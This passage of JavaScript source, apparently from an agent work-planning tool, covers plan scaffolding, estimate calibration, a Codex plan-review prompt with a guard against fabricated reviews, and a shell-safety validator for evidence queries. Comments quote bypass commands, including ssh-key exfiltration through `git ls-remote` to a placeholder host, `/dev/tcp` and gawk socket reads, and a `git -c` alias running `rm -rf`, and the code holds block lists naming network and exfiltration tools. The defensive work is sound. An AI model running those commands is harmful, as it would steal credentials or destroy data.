    for (const h of plan.heldOut) lines.push(`- **${h.id ?? h}** — ${h.why ?? "unresolved gate"}`);
    lines.push(``);
  }
  lines.push(`## Decisions (made BEFORE the run — there are no mid-run human gates)`, ``);
  if (plan.decisions?.length) {
    for (const d of plan.decisions) lines.push(`- **Q:** ${d.q}\n  **A:** ${d.a}${d.by ? ` — _${d.by}${d.at ? `, ${d.at}` : ""}_` : ""}`);
  } else {
    lines.push(`_None recorded._`);
  }
  lines.push(``);
  return lines.join("\n") + "\n";
}

export function scaffoldPlan({ issues = [], label = null, date = null, specRef = null, tracking = null, units = 0 } = {}) {
  // Spec mode: `--spec-ref <doc> --tracking DER-N --units N` scaffolds SPEC-<label>-U1..UN instead of a
  // list of Linear ids. The rest of the entry shape is IDENTICAL — same budget, same risk lane, same
  // plan-review gate — because those are the parts with measured value; only the naming changes.
  const specUnits = specRef && units > 0
    ? Array.from({ length: units }, (_, i) => `SPEC-${String(label ?? "spec").toUpperCase().replace(/[^A-Z0-9]+/g, "")}-U${i + 1}`)
    : [];
  return {
    label,
    date,
    ...(specRef ? { specRef, tracking } : {}),
    budget: { ...PLAN_BUDGET },
    issues: (specUnits.length ? specUnits : issues).map((id) => ({
      id,
      budget: { files: null, additions: null },
      surfaces: [],
      coreUnits: 1,
      riskLane: null,
      leadType: null,
      bundleWith: [],
      versionAxes: [],
      dependsOn: [],
      checks: [],
      evidenceQueries: [],
      symbols: [],
      notes: null,
      splitFrom: null,
    })),
    serialization: [],
    heldOut: [],
    decisions: [],
  };
}

// ---------------------------------------------------------------------------
// Calibration — the estimates WILL be wrong; without this they ossify at the first guess
// ---------------------------------------------------------------------------
// actuals: [{id, files, additions}] — from `gh pr view <n> --json changedFiles,additions`.
export function calibrate(plan, actuals = [], { run = null } = {}) {
  const byId = new Map((plan?.issues ?? []).map((i) => [i.id, i]));
  const rows = [];
  for (const a of actuals) {
    const planned = byId.get(a.id)?.budget;
    if (!planned || !planned.files) continue;
    rows.push({
      id: a.id,
      plannedFiles: planned.files,
      actualFiles: a.files,
      plannedAdditions: planned.additions,
      actualAdditions: a.additions,
      fileRatio: round2(a.files / planned.files),
      additionRatio: round2(a.additions / planned.additions),
    });
  }
  const med = (xs) => {
    if (!xs.length) return null;
    const s = [...xs].sort((x, y) => x - y);
    const m = Math.floor(s.length / 2);
    return round2(s.length % 2 ? s[m] : (s[m - 1] + s[m]) / 2);
  };
  return {
    rows,
    medianFileRatio: med(rows.map((r) => r.fileRatio)),
    medianAdditionRatio: med(rows.map((r) => r.additionRatio)),
    n: rows.length,
    // >1 means the table under-sizes: scale CORE_UNIT / surface additions up by this factor.
    suggestion: rows.length >= 3
      ? `Multiply the sizing table by ~${med(rows.map((r) => r.additionRatio))}× on additions and ~${med(rows.map((r) => r.fileRatio))}× on files (n=${rows.length}).`
      : `Only ${rows.length} data point(s) — collect more before moving the table.`,
    // The table moves only when a ratio HOLDS ACROSS TWO RUNS — and "two runs" has to mean two, which
    // is why `run` is required here rather than inferred. Without it this function will happily compare
    // the stored measurement against the very actuals it was derived from and report agreement: a check
    // that cannot return "no", which is the exact defect class this repo's review rules exist to reject.
    // Self-comparison is therefore an explicit refusal, not a pass.
    confirmsPrior: rows.length >= 3 && CALIBRATION.measured
      ? (() => {
          const prior = CALIBRATION.measured;
          if (!run) {
            return { agree: null, prior, note: `Cannot confirm: pass --run <run-id> so this can be checked against ${prior.run} rather than compared with itself.` };
          }
          if (run === prior.run) {
            return { agree: null, prior, note: `REFUSING to confirm: these actuals are from ${run}, the SAME run the stored ${prior.additions}×/${prior.files}× measurement came from. A measurement cannot confirm itself — bring a second run.` };
          }
          const a = med(rows.map((r) => r.additionRatio));
          const f = med(rows.map((r) => r.fileRatio));
          const close = (x, y) => x != null && y != null && Math.abs(x - y) / Math.max(x, y) <= 0.25;
          const agree = close(a, prior.additions) && close(f, prior.files);
          return {
            agree,
            prior,
            note: agree
              ? `${run} CONFIRMS ${prior.run} (${prior.additions}× / ${prior.files}×) — two independent runs agree, so the table may now be moved: re-run with --apply.`
              : `${run} does NOT match ${prior.run} (${prior.additions}× / ${prior.files}×). Two runs disagree — do NOT move the table on either; find out what differed first.`,
          };
        })()
      : null,
  };
}

const round2 = (n) => Math.round(n * 100) / 100;

// ---------------------------------------------------------------------------
// Plan review — run the REAL reviewer against the PLAN, before any code exists
// ---------------------------------------------------------------------------
//
// The GitHub Codex reviewer is the run's dominant recycle cost, and most of what it flags is
// PREDICTABLE from the repo's own review corpus. Reviewing the plan is the cheapest possible moment to
// catch those findings: a plan edit costs one re-brief, the same finding on a PR costs a review round
// (~100-150M tokens, ~$35-50). This mirrors the plan-before-patch protocol the repo already runs for
// review REMEDIATION (AGENTS.md § "Review findings use a plan-before-patch subagent") and moves it one
// phase earlier, to the implementation plan itself.
//
// Four things decide whether the instrument works, all measured 2026-07-25 and recorded in
//   (a) plain `codex exec`, NEVER `codex exec review --base` — that subcommand is diff-local (and there
//       is no diff yet here), and it refuses a custom prompt outright;
//   (b) the prompt must MANDATE searching — grep the real call sites and enumerate the family;
//   (c) run it in a checkout with `node_modules` present, or it goes blind;
//   (d) it obeys `## Code Review Rules` in AGENTS.md, so the repo's own corpus steers it for free.
export const PLAN_REVIEW_SCHEMA = {
  type: "object",
  additionalProperties: false,
  required: ["verdict", "watch_outs"],
  properties: {
    verdict: { type: "string", enum: ["plan is sound", "plan has gaps", "plan is wrong"] },
    watch_outs: {
      type: "array",
      items: {
        type: "object",
        additionalProperties: false,
        required: ["class", "instruction"],
        properties: {
          class: { type: "string", description: "the review-rule defect class this plan shape invites" },
          instruction: { type: "string", description: "a concrete instruction for THIS issue, phrased as an AC" },
          severity: { type: "string", enum: ["blocker", "major", "minor"] },
          evidence: { type: "string", description: "the file:line or call site that grounds it" },
        },
      },
    },
    missing_from_plan: { type: "array", items: { type: "string" } },
    size_challenge: { type: "string", description: "why the assigned budget is or is not achievable" },
  },
};

export function planReviewPrompt(issue = {}, { repoRoot = ".", corpus = [] } = {}) {
  const b = issue.budget ?? {};
  return [
    `You are reviewing an IMPLEMENTATION PLAN before any code exists. There is no diff. Your job is to`,
    `predict the findings a strict reviewer WILL write against the eventual PR, so they can be designed`,
    `out now instead of costing a review round later.`,
    ``,
    `Repository: ${repoRoot}`,
    `Issue: ${issue.id ?? "(unknown)"}${issue.title ? ` — ${issue.title}` : ""}`,
    `Risk lane: ${issue.riskLane ?? "(none)"}   Lead type: ${issue.leadType ?? "(none)"}`,
    `Surfaces it claims to touch: ${(issue.surfaces ?? []).join(", ") || "(none declared)"}`,
    `ASSIGNED budget: ${b.files ?? "?"} files / ~${b.additions ?? "?"} additions`,
    issue.versionAxes?.length ? `Version-holder axes: ${issue.versionAxes.join(", ")}` : null,
    issue.dependsOn?.length ? `Depends on (must build ON their merged shape): ${issue.dependsOn.join(", ")}` : null,
    ``,
    `Plan notes / acceptance:`,
    issue.notes ? issue.notes : "(none recorded — that is itself worth flagging)",
    issue.acceptance ? `\nAcceptance criteria:\n${issue.acceptance}` : "",
    ``,
    `MANDATE — do not reason about this repository from memory, SEARCH it:`,
    `1. Read AGENTS.md § "Code Review Rules" and the per-package AGENTS.md of every package this issue`,
    `   touches. Every rule there is a defect class this reviewer has ACTUALLY posted before.`,
    `2. grep the real call sites this change implies. Enumerate the FAMILY — every sibling entry in the`,
    `   registry/enum/switch/guard the plan touches — and list the members the plan does not mention.`,
    `3. Prefer EXECUTING things over reasoning about them: run the existing tests for the area, run the`,
    `   guards, read the actual current file contents.`,
    `4. For every claim the plan makes about existing behavior, verify it against the code. A plan that`,
    `   describes a defect in the PAST TENSE may be describing something already fixed on main.`,
    ``,
    `Answer these, grounded in what you found:`,
    `- Which review-rule defect classes does THIS change shape invite? (incomplete family edit, silent`,
    `  loss of explicit input, error precedence, a predicate comparing the wrong operand, a test bound to`,
    `  a symbol rather than the production call site, a SQL predicate mirroring a validator, copy whose`,
    `  accuracy depends on behavior this change alters, a check that cannot return the failing answer.)`,
    `- What is MISSING from the plan that the reviewer will require? (a must-fail control, a sibling`,
    `  surface, a doc/copy update the behavior change invalidates, a cross-tenant test on a new table.)`,
    `- Is the assigned budget achievable, or does the change drag more with it than the plan assumes?`,
    ``,
    `Return watch-outs as "class → concrete instruction for THIS issue". Each one is a finding that has`,
    `not been written yet; the lead implements TOWARD them and self-checks against them before hand-off.`,
    corpus.length ? `\nAlso weigh these recent kickback classes from this repo's last run:\n${corpus.map((c) => `- ${c}`).join("\n")}` : "",
  ].filter((l) => l !== null).join("\n");
}

export function planReviewCommand({ promptFile, outFile, logFile, repoRoot = "." }) {
  // Deliberately `codex exec`, not `codex exec review --base` — see (a) above. `--json` is load-bearing:
  // without it the completion guard below has no `turn.completed` to look for (DER-2518 cost a mid-run
  // fix when it was omitted from the PR gate's own command).
  return `cd ${JSON.stringify(repoRoot)} && codex exec --json --sandbox read-only ` +
    `--output-schema ${JSON.stringify(join(".", "plan-review-schema.json"))} ` +
    `--output-last-message ${JSON.stringify(outFile)} - < ${JSON.stringify(promptFile)} > ${JSON.stringify(logFile)} 2>&1`;
}

// The fabrication guard, learned on DER-2504: `codex exec` can COMPLETE with command_execution=0 and
// return wholly FABRICATED findings — it never opened the repo, and the answer still looks like a
// review. For a PLAN review that is the whole risk, because there is no diff to sanity-check the output
// against. Two independent conditions, both required:
//   - `turn.completed` present  → the run finished rather than dying silently (a dead run EXITS 0);
//   - command_execution > 0     → it actually searched, rather than inventing.
// A review that fails either is REFUSED, not recorded. Recording it would write a confident, empty
// watch-out list into the plan and read as "reviewed".
export function planReviewAccepted(logText, { minCommands = 1 } = {}) {
  let turnCompleted = false;
  let commands = 0;
  for (const line of String(logText ?? "").split("\n")) {
    if (!line.trim()) continue;
    let e;
    try { e = JSON.parse(line); } catch { continue; }
    if (e?.type === "turn.completed") turnCompleted = true;
    if (e?.type === "command_execution" || (e?.type === "item.completed" && e?.item?.type === "command_execution")) commands += 1;
  }
  const reasons = [];
  if (!turnCompleted) reasons.push("no `turn.completed` in the log — the gate DIED (it exits 0 when it does); this is not a clean review");
  if (commands < minCommands) reasons.push(`command_execution=${commands} — the reviewer never searched the repo, so its findings are unfalsifiable (DER-2504: a 0-command run returned wholly fabricated findings)`);
  return { accepted: reasons.length === 0, turnCompleted, commands, reasons };
}

// Fold an accepted review into the plan entry. Watch-outs land in `notes` too, because that is the field
// `work-runner write-brief --acceptance` carries into the brief verbatim — a watch-out the lead never
// reads is not a control.
export function applyPlanReview(issue, review, { sha = null, model = "codex", commands = 0 } = {}) {
  const watchOuts = (review?.watch_outs ?? []).map((w) => ({
    class: w.class, instruction: w.instruction, severity: w.severity ?? "major", evidence: w.evidence ?? null,
  }));
  issue.planReview = {
    verdict: review?.verdict ?? "unknown",
    reviewedAt: new Date().toISOString(),
    model, commands, sha,
    missingFromPlan: review?.missing_from_plan ?? [],
    sizeChallenge: review?.size_challenge ?? null,
  };
  issue.watchOuts = watchOuts;
  const block = watchOuts.length
    ? `**Codex watch-outs (plan review, ${watchOuts.length}):**\n${watchOuts.map((w) => `- ${w.class} → ${w.instruction}`).join("\n")}`
    : `**Codex watch-outs:** none — the plan review found no predictable finding class for this shape.`;
  issue.notes = issue.notes ? `${issue.notes}\n\n${block}` : block;
  return issue;
}

// ---------------------------------------------------------------------------
// Grounding gates (2026-07-29) — deterministic complements to the plan review
// ---------------------------------------------------------------------------
// Why these exist: an implementation plan in this repo was written by an agent that explicitly cited
// "a check that cannot fail is not evidence", was revised twice while actively hunting that exact class,
// and still shipped SIX vacuous checks — found only by two independent reviewers. The class survives
// attention; it does not survive arithmetic. The codex plan review (above) is the probabilistic
// instrument that catches what a plan FAILS to claim; these four are the deterministic instrument that
// grounds what it DOES claim:
//   1. mutation-check  — every declared check names the mutation that makes it FAIL, and post-
//      implementation the failure actually OBSERVED (a described failure is not an observed one).
//   2. query-check     — every query used as evidence must reproduce a known-positive historical window.
//      The 07-28 kill criterion's grep matched 2 of the 6 commits its own plan cited: it would have
//      returned zero and auto-selected "delete the tool" while the problem recurred.
//   3. symbol-check    — every named call/test target must exist and be importable from where the plan
//      implies (a brief demanding a test of a non-exported function is unimplementable as written).
//   4. priorart-check  — sweep tests/guards for prior art already asserting the property (two of one
//      wave's planned deliverables existed in full). ADVISORY: candidates for human judgement, never cuts.
// Gates 1–3 REFUSE in `validate`; gate 4 warns. The split is deliberate: 1–3 detect claims that are
// mechanically false, while 4 is a heuristic whose false positives would train the operator to
// rubber-stamp a refusal — and deleting work is a human call, never the tool's.

// A declared check must name the edit that breaks it. `observedFailure` is filled in by the IMPLEMENTER
// after seeing the check fail — demanded by `mutation-check --require-observed` (post-implementation),
// not by plan-time validate, because at plan time the check does not yet exist to observe.
export function checkEntryProblems(check) {
  if (!check || typeof check !== "object") return ["not an object — checks are {name, mutation, observedFailure}"];
  const problems = [];
  if (!check.name || typeof check.name !== "string" || !check.name.trim()) problems.push("needs a name");
  if (!check.mutation || typeof check.mutation !== "string" || !check.mutation.trim()) {
    problems.push("declares no mutation — name the EXACT edit that makes this check fail. A check whose author cannot name what breaks it is the vacuous-check class this gate exists for.");
  }
  return problems;
}

export function checkMutations(plan, issueId = null, { requireObserved = false } = {}) {
  const rows = [];
  for (const it of plan?.issues ?? []) {
    if (issueId && it.id !== issueId) continue;
    if (it.checks !== undefined && !Array.isArray(it.checks)) {
      rows.push({ id: it.id, index: null, name: null, problems: ["checks must be an array"] });
      continue;
    }
    for (const [ci, c] of (it.checks ?? []).entries()) {
      const problems = checkEntryProblems(c);
      if (requireObserved && !(typeof c?.observedFailure === "string" && c.observedFailure.trim())) {
        problems.push("no observedFailure recorded — APPLY the mutation, SEE the check fail, record the exact failure message, then revert. A described failure is not an observed one.");
      }
      rows.push({ id: it.id, index: ci, name: c?.name ?? null, problems });
    }
  }
  return { rows, failures: rows.filter((r) => r.problems.length), ok: rows.every((r) => !r.problems.length) };
}

export const MUTATION_AC_MARKER = "**Must-fail checks (mutation gate):**";

// The AC block `mutation-check --record` folds into `notes` — the field `write-brief --acceptance`
// carries into the lead's brief verbatim. The criterion requires OBSERVING the failure, not describing it.
export function mutationAcBlock(checks = []) {
  return [
    `${MUTATION_AC_MARKER} for each check below: apply the mutation, run the check, OBSERVE it fail, record the exact failure message in this plan entry's checks[].observedFailure, then revert the mutation. A described failure is not an observed one; \`mutation-check --require-observed\` verifies the record.`,
    ...checks.filter((c) => c?.name && c?.mutation).map((c) => `- ${c.name} → mutate: ${c.mutation}`),
  ].join("\n");
}

export function evidenceQueryProblems(q) {
  if (!q || typeof q !== "object") return ["not an object — evidence queries are {name, query, window, expectAtLeast}"];
  const problems = [];
  if (!q.query || typeof q.query !== "string" || !q.query.trim()) problems.push("has no query");
  if (!Number.isFinite(q.expectAtLeast) || q.expectAtLeast < 1) {
    problems.push("has no known-positive floor — set expectAtLeast ≥ 1: the count the query MUST return on a window where the thing is KNOWN to have happened");
  }
  if (!q.window || typeof q.window !== "string" || !q.window.trim()) {
    problems.push(`names no historical window — say WHICH known-positive history the floor comes from (e.g. "2026-07-20..26, the 6 axis-collision commits the plan cites")`);
  }
  return problems;
}

// ---------------------------------------------------------------------------
// SHELL SAFETY for evidenceQueries[].query (2026-07-29)
// ---------------------------------------------------------------------------
// `query-check` runs each query in the operator's repo with the operator's credentials and ssh agent. The
// query text arrives from the PLAN FILE, and a plan is assembled from Linear issue prose and from lead
// output, so this is a path from semi-trusted content to command execution.
//
// UNTIL 2026-07-30 THAT PATH ENDED IN spawnSync(…, { shell: true }), AND THAT MADE THE VALIDATOR BELOW
// DECORATIVE (DER-2836). A shell expands the query a SECOND time, after validation, so the arguments the
// command finally received were not the arguments any rule here read. `find . $(printf -- -delete)` passed
// every check — the substitution was validated on its own (`printf` is read-only and allowlisted) and then
// collapsed to a placeholder, so `find`'s `-delete` rule was applied to a word that was not yet `-delete`.
// The same hole was `$'-delete'` and `$EVIL` (no substitution at all, just expansion) and an unquoted glob
// in a repo containing a file NAMED `-delete`. Enumerating shell expansions and refusing each one is a fix
// that is only as good as the enumeration; the fix taken instead REMOVES THE EXPANDER:
//
//   `runEvidenceQuery` executes the parsed pipeline in ARGV form — spawnSync(cmd, args) with no shell, one
//   stage at a time, stdout of each piped into the next. There is no second expansion, so the argument the
//   rules below read IS the argument execve delivers. That is a property of the execution model, not of
//   this file's list of things a shell can do. The sibling sweep in priorart-check already ran its engines
//   this way and reasoned in its comment about what the shell hides — the query runner was the outlier.
//
// Because nothing expands them any more, words that a shell WOULD have expanded are refused rather than
// passed through literally: an operator who wrote `$(git rev-parse HEAD)` meant the commit, not the eleven
// characters, and silently running the literal text would answer a different question. That refusal is
// about honesty, and about defense in depth if a future caller reintroduces a shell — it is NOT what makes
// this safe. Argv execution is.
//
// The queries are LEGITIMATELY shell pipelines — `git log --oneline --since=… | grep -c 'fix('` is the
// documented shape — so banning pipes or quotes would delete the feature. Instead this is an ALLOWLIST
// over the parsed query:
//
//   1. Tokenize with quote awareness, then split on the shell's own operators. Every SEGMENT (each stage
//      of a pipe, each side of `&&`/`||`/`;`) is validated independently — an allowlisted head does not
//      launder what comes after the pipe.
//   2. Each segment's command must be a LITERAL name (no `$VAR`, no substitution, no `/path/to/x`, no
//      `FOO=bar cmd`) that is on QUERY_READONLY_COMMANDS: commands whose PURPOSE is to read and print.
//      Anything unrecognised is REFUSED, not run. That asymmetry is the whole design — a false refusal is
//      visible to the operator and one allowlist line to widen; a false permit is a run nobody sees.
//   3. Commands that read by default but carry their own write/exec escape hatch get a per-command rule:
//      `sed -i` / sed's `w`,`r`,`e` commands, `sort -o`, `awk`'s `system()`/`print >`/`getline <` and its
//      DEFAULT-DENY option list, `find -exec` / `-delete`, `rg --pre`, and git's non-read subcommands
//      (`config`, `checkout`, `ls-remote`, …) plus `-c` (alias injection) and `--output=` (writes a file).
//   4. Output redirection is refused unless the target is `/dev/null`; fd duplication (`2>&1`) is fine;
//      input redirection (`< file`) is a read ONLY when the target is a literal path that is not a socket
//      — `< /dev/tcp/host/port` is an outbound connection and `< $(…)` is an unchecked command. `&`
//      (background), subshell grouping, heredocs and process substitution are refused as unparsed-by-us
//      rather than assumed safe.
//   5. A word carrying ANY shell expansion — `$(…)`, backticks, `$VAR`, `$'…'`, `${…}` — is refused in
//      EVERY position, not only the command name. Before DER-2836 substitutions were instead validated
//      recursively and allowed, which is what made rule 3 bypassable: a nested command that is itself
//      read-only (`printf`, `echo`, `cat`) still emits arbitrary TEXT, and that text became an option of
//      the outer command. An unquoted glob (`*`, `?`, `[…]`) is refused for the adjacent reason: argv
//      execution does not expand it, so it would silently match nothing where a shell matched files.
//
// READ-ONLY IS NOT THE WHOLE TEST — THE SECOND TEST IS "CAN IT REACH A NETWORK" (DER-2777). A command that
// writes nothing locally still exfiltrates if it can name a remote, because the request URL lands in the
// attacker's access log BEFORE the request fails. Three such channels hid behind "read-only":
// `git ls-remote https://host/$(cat ~/.ssh/id_ed25519 | tr -dc 'A-Za-z0-9')` (ls-remote reads, over the
// network, with the operator's ssh agent); gawk's `/inet/tcp/0/host/80` special files, reachable from
// `getline <` inside a program the shell-level checks never see; and bash's `< /dev/tcp/host/port`, which
// the input-redirect branch waved through because reading is a read. All three are refused now, and the
// awk option list is default-deny (`-fprog.awk` defeated the exact-match `-f` check that preceded it).
//
// Deliberately NOT on the allowlist even though each is common in shell: `xargs` (its child command is
// arbitrary), `tee` (writes), `sh`/`bash`/`node`/`python`/`perl` (arbitrary), `env`/`eval`/`exec`
// (arbitrary), `curl`/`wget`/`nc`/`ssh`/`scp`/`rsync` (exfiltration), `sudo`/`su` (escalation),
// `rm`/`mv`/`cp`/`chmod`/`dd`/`truncate`/`ln` (destructive), `base64`/`openssl` (smuggling a payload past
// a reader's eyes). Those are also named in QUERY_REFUSED_COMMANDS purely so the refusal message says
// WHY rather than "unrecognised".
export const QUERY_READONLY_COMMANDS = new Set([
  // No `ag`/`ack`: both can hand matches to an external pager/program, and neither is used here — an
  // allowlist entry is a promise about that tool's flags, so it is only worth making for tools we use.
  "git", "rg", "grep", "egrep", "fgrep",
  "sed", "awk", "gawk", "jq", "find",
  "wc", "sort", "uniq", "head", "tail", "cut", "tr", "comm", "paste", "nl", "rev", "seq", "column", "fold",
  "cat", "ls", "stat", "diff", "basename", "dirname", "date", "printf", "echo", "pwd", "true", "false",
  "test", // a predicate: inspects and exits, writes nothing. `test -f x && rm y` still refuses at the `rm` segment.
]);

// Named only for the error message — every one of these is already refused by the allowlist above.
const QUERY_REFUSED_COMMANDS = new Map([
  ...["rm", "rmdir", "mv", "cp", "ln", "install", "chmod", "chown", "chgrp", "dd", "truncate", "mkfifo", "mknod", "shred", "tee", "touch", "mkdir"]
    .map((c) => [c, "writes or destroys files"]),
  ...["curl", "wget", "nc", "ncat", "netcat", "telnet", "ssh", "scp", "sftp", "rsync", "ftp", "mail", "sendmail", "pbcopy", "osascript"]
    .map((c) => [c, "can move repo contents off the machine (exfiltration)"]),
  ...["sudo", "doas", "su", "security", "defaults", "launchctl", "crontab", "at", "kill", "killall", "chflags"]
    .map((c) => [c, "escalates privilege or reconfigures the machine"]),
  ...["sh", "bash", "zsh", "dash", "ksh", "fish", "node", "deno", "bun", "python", "python2", "python3", "perl", "ruby", "php", "eval", "exec", "source", ".", "env", "nohup", "xargs", "make", "npm", "npx", "pnpm", "yarn", "pip", "pip3", "gh", "docker", "kubectl", "brew", "apt", "apt-get"]
    .map((c) => [c, "runs an arbitrary command of its own, so allowing it allows everything"]),
  ...["base64", "openssl", "gpg", "uudecode", "xxd", "openssl-enc"]
    .map((c) => [c, "is a payload smuggler here — it has no read-only evidence use"]),
]);

// No `ls-remote`: it reads, but it reads over the NETWORK, and the URL is an attacker-chosen string. The
// only in-repo mention (`skills/work/SKILL.md`, the multi-host boot probe) is an operator runbook line run
// over ssh — it never reaches this validator.
const GIT_READ_SUBCOMMANDS = new Set([
  "log", "show", "diff", "diff-tree", "diff-files", "diff-index", "whatchanged", "shortlog", "blame", "annotate",
  "grep", "ls-files", "ls-tree", "cat-file", "rev-list", "rev-parse", "show-ref", "for-each-ref",
  "name-rev", "merge-base", "describe", "status", "count-objects", "check-ignore", "check-attr", "var", "version",
]);
// Named only for the error message — none of these is on the allowlist above, so all are already refused.
// They are called out because "not read-only" reads as wrong for `ls-remote`: the problem is not that it
// writes, it is that it dials out, and a refusal that says so is the one an operator can act on. Only
// subcommands that contact a remote BY DEFINITION are listed — `remote -v`, `submodule status` and
// `upload-pack` (the server side, over stdio) do not, and would make this message a false claim; they
// stay on the generic "not a read-only subcommand" path.
const GIT_REFUSED_SUBCOMMANDS = new Map(
  ["ls-remote", "fetch", "pull", "push", "clone"]
    .map((s) => [s, "contacts a REMOTE — the URL is an outbound channel, and everything before the request fails is already in the server's access log"]),
);
// Global options that are safe (or safe-with-a-value); anything else before the subcommand is refused,
// which is what catches `git -c alias.x='!rm -rf .' x` — a config injection that executes.
const GIT_GLOBAL_SAFE = new Set(["--no-pager", "-p", "--paginate", "--no-replace-objects", "--literal-pathspecs", "--glob-pathspecs", "--noglob-pathspecs", "--icase-pathspecs", "--bare", "--no-optional-locks", "--no-lazy-fetch"]);
const GIT_GLOBAL_WITH_VALUE = new Set(["-C", "--git-dir", "--work-tree", "--namespace"]);
// Read subcommands that can still write a file or run a program if you ask them to.
const GIT_REFUSED_ARGS = [
  [/^--output(=|$)/, "--output writes a file"],
  [/^--exec-path(=|$)/, "--exec-path relocates git's helper binaries"],
  [/^--ext-diff$/, "--ext-diff runs an external diff program"],
  [/^(-O|--open-files-in-pager)/, "-O/--open-files-in-pager runs a program on the matches"],
  [/^--(upload|receive)-pack(=|$)/, "--upload-pack/--receive-pack names a program to execute"],
];

// awk options are DEFAULT-DENY against these two closed sets: an option that is not on them is REFUSED,
// never skipped. Skipping every `-`-shaped argument is precisely what let `-fprog.awk` past the
// exact-match `-f` check that used to sit above it, and what left `--source=`, `-e`, `-o`/`-p`/`-d`
// (write a file), `-l`/`--include` (load a shared library) and `--exec` completely unexamined.
const AWK_OPTIONS_NO_VALUE = new Set([
  "--posix",
  // gawk-only, and it can only ever REMOVE capability (no system(), no redirection, no getline from a
  // file). Allowed so an operator MAY harden a query; not forced, because this validator is a predicate —
  // it never rewrites the query, so what runs is always the text that was reviewed and logged.
  "--sandbox",
]);
const AWK_OPTIONS_WITH_VALUE = new Set(["-F", "--field-separator", "-v", "--assign"]);
// gawk's `/inet/…` (also `/inet4/`, `/inet6/`) special files are SOCKETS; `/dev/` non-null covers
// `/dev/tcp`, `/dev/stdout` and friends. Refused in EVERY awk argument position — program text, file
// operand and option value alike — because `getline < "/inet/tcp/0/host/80"` reads from a program string
// the shell-level checks never parse.
const AWK_SPECIAL_FILE = /\/inet[46]?\/|\/dev\/(?!null\b)/;
const AWK_PROGRAM_EXEC = /system\s*\(|\bclose\s*\(|ENVIRON/;

// A sed script is read-only only if it neither writes (`w`, `W`, the `s///w` flag) nor reads/executes
// (`r`, `R`, `e`, the `s///e` flag). Command-position detection is a heuristic over the addressed form.
const SED_S_WRITE_OR_EXEC = /s(.)(?:\\.|(?!\1)[^\n])*?\1(?:\\.|(?!\1)[^\n])*?\1[a-zA-Z0-9]*[weW]/;
const SED_CMD_WRITE_OR_EXEC = /(?:^|[;{}\n])\s*(?:\d+|\$|\/(?:\\.|[^/\n])*\/)?(?:\s*,\s*(?:\d+|\$|\/(?:\\.|[^/\n])*\/))?\s*!?\s*[wWrRe](?:$|[\s;])/;

// Per-command argument rules. Each returns a list of problem strings.
const QUERY_COMMAND_RULES = {
  git(args) {
    const problems = [];
    let i = 1;
    while (i < args.length && args[i].startsWith("-")) {
      const a = args[i];
      const head = a.split("=")[0];
      if (GIT_GLOBAL_SAFE.has(a)) { i += 1; continue; }
      if (GIT_GLOBAL_WITH_VALUE.has(head)) { i += a.includes("=") ? 1 : 2; continue; }
      problems.push(`git global option \`${a}\` is not on the read-only allowlist (\`-c\` alone can inject an alias that executes anything)`);
      return problems;
    }
    const sub = args[i];
    if (!sub) { problems.push("`git` with no subcommand reads nothing"); return problems; }
    if (!GIT_READ_SUBCOMMANDS.has(sub)) {
      const why = GIT_REFUSED_SUBCOMMANDS.get(sub);
      problems.push(why
        ? `\`git ${sub}\` ${why} — refused`
        : `\`git ${sub}\` is not a read-only git subcommand — evidence queries may use ${[...GIT_READ_SUBCOMMANDS].slice(0, 8).join("/")}/… only`);
      return problems;
    }
    for (const a of args.slice(i + 1)) {
      for (const [re, why] of GIT_REFUSED_ARGS) if (re.test(a)) problems.push(`\`git ${sub} ${a}\` is refused: ${why}`);
    }
    return problems;
  },
  sed(args) {
    const problems = [];
    for (const a of args.slice(1)) {
      if (/^--in-place/.test(a) || (/^-[^-]*i/.test(a) && !a.startsWith("--"))) problems.push("`sed -i`/--in-place EDITS FILES — an evidence query may only read");
      if (SED_S_WRITE_OR_EXEC.test(a) || SED_CMD_WRITE_OR_EXEC.test(a)) problems.push(`sed script \`${a}\` uses a w/W/r/R/e command or s///w|e flag — those write files or execute a shell`);
    }
    return problems;
  },
  awk(args) {
    const problems = [];
    const operands = []; // the program text and any file operands
    const values = []; // [option, value] pairs for the allowed value-taking options
    let literalsOnly = false;
    let i = 1;
    while (i < args.length) {
      const a = args[i];
      // `-` alone is stdin, a legitimate operand. Everything after `--` is an operand by definition.
      if (literalsOnly || a === "-" || !a.startsWith("-")) { operands.push(a); i += 1; continue; }
      if (a === "--") { literalsOnly = true; i += 1; continue; }
      const long = a.startsWith("--");
      const eq = a.indexOf("=");
      const head = long ? (eq > 0 ? a.slice(0, eq) : a) : a.slice(0, 2);
      // The ATTACHED value, if any — `-F:`, `-vk=1`, `--field-separator=:`. `-fprog.awk` is exactly this
      // shape, which is why an exact-match check on `-f` alone could never have caught it.
      const attached = long ? (eq > 0 ? a.slice(eq + 1) : null) : (a.length > 2 ? a.slice(2) : null);
      if (AWK_OPTIONS_NO_VALUE.has(head) && attached === null) { i += 1; continue; }
      if (AWK_OPTIONS_WITH_VALUE.has(head)) {
        if (attached !== null) { values.push([head, attached]); i += 1; continue; }
        if (i + 1 >= args.length) { problems.push(`\`awk ${a}\` is missing its value`); return problems; }
        values.push([head, args[i + 1]]);
        i += 2;
        continue;
      }
      problems.push(`awk option \`${a}\` is not on the awk read-only option allowlist (${[...AWK_OPTIONS_WITH_VALUE, ...AWK_OPTIONS_NO_VALUE].join(" ")} --) — an UNRECOGNISED option is REFUSED, not skipped: \`-f\`/\`--source\`/\`-e\` take the program from somewhere this validator cannot read, \`-o\`/\`-p\`/\`-d\` write a file, \`-l\`/\`--include\` load a shared library`);
      return problems;
    }
    for (const [opt, v] of values) {
      if ((opt === "-v" || opt === "--assign") && !/^[A-Za-z_][A-Za-z_0-9]*=/.test(v)) {
        problems.push(`\`awk ${opt} ${v}\` is not a \`var=value\` assignment — refused rather than guessed at`);
      }
      if (AWK_SPECIAL_FILE.test(v)) problems.push(`\`awk ${opt} ${v}\` names a socket or device special file — a variable is a filename once the program says \`getline < var\``);
    }
    for (const a of operands) {
      if (AWK_PROGRAM_EXEC.test(a)) problems.push(`awk program \`${a}\` calls system()/close()/ENVIRON — awk is a shell when you let it be`);
      if (AWK_SPECIAL_FILE.test(a)) problems.push(`awk argument \`${a}\` names a device or gawk /inet socket special file — \`getline < "/inet/tcp/0/host/80"\` is an outbound connection made from inside the program`);
      // `print > "f"` writes, `print | "cmd"` executes, `getline < "f"` reads a file (or a socket) — all
      // three from inside the program, where the shell-level checks cannot see them. Refusing `<`/`>`/`|`
      // also refuses a numeric comparison (`$1 > 5`); that is the deliberate fail-closed side of the trade.
